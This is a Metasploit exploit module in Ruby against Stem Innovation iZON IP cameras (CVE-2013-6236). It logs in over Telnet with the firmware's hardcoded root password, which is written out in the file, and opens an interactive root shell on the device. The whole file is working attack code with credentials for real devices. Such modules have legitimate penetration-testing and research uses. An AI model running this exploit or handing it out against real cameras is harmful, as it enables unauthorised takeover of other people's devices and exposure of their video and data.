# -*- coding: binary -*-

##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Telnet
  include Msf::Auxiliary::CommandShell
  include Msf::Auxiliary::Report

  TELNET_USERNAME = 'root'
  TELNET_PASSWORD = 'stemroot'
  BANNER_REGEX = /^izon\slogin:$/
  LOGIN_SUCCESS_REGEX = /^root\@izon\s\#/

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Stem Innovation iZON Telnet Known Root Password',
      'Description'    => %q{
          Early iZON firmware shipped with a hardcoded root password and the 
	  Telnet service enabled, allowing for remote administrative access.
        },
      'Author'         => [ 'mstanislav' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
	  [ 'URL', 'https://www.duosecurity.com/blog/izon-ip-camera-hardcoded-passwords-and-unencrypted-data-abound' ],
          [ 'CVE', '2013-6236' ],
	  [ 'OSVDB', '99069' ]
        ],
      'Privileged'     => true,
      'Platform'       => 'unix',
      'ARCH'           => ARCH_CMD,
      'Payload'     =>
        {
          'Compat'  => {
            'PayloadType'    => 'cmd_interact',
            'ConnectionType' => 'find',
          },
        },
      'Targets'     => [ [ "Universal", {} ] ],
      'DefaultTarget'  => 0,
      'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/interact' },
      'DisclosureDate' => 'Sep 13 2013'
  ))

  deregister_options('USERNAME','PASSWORD')

  register_advanced_options(
    [
      OptInt.new('FindHandlerTimeout', [ true, 'Timeout for the handler to determine if a shell is present.', 3])
    ]
  )

  end

  def exploit
    connect
    if login_banner?
      print_status("#{rhost}:#{rport} Attempting login with #{user}:#{pass}...")
    else
      print_error("#{rhost}:#{rport} Doesn't appear to be vulnerable.")
      return
    end
    send_user(user)
    send_pass(pass)
    ret = sock.get_once
    if ret =~ LOGIN_SUCCESS_REGEX
      vprint_status("#{rhost}:#{rport} Login successful!")
      handler(sock)
    else
      print_error("#{rhost}:#{rport} Login unsuccessful.")
      sock.close unless sock.closed?
    end
  end

  def user
    TELNET_USERNAME
  end

  def pass
    TELNET_PASSWORD
  end

  def login_banner?
    banner_sanitized = Rex::Text.to_hex_ascii(banner.to_s)
    vprint_status("#{rhost}:#{rport} Connected: #{banner_sanitized}")
    banner.match BANNER_REGEX
  end

end
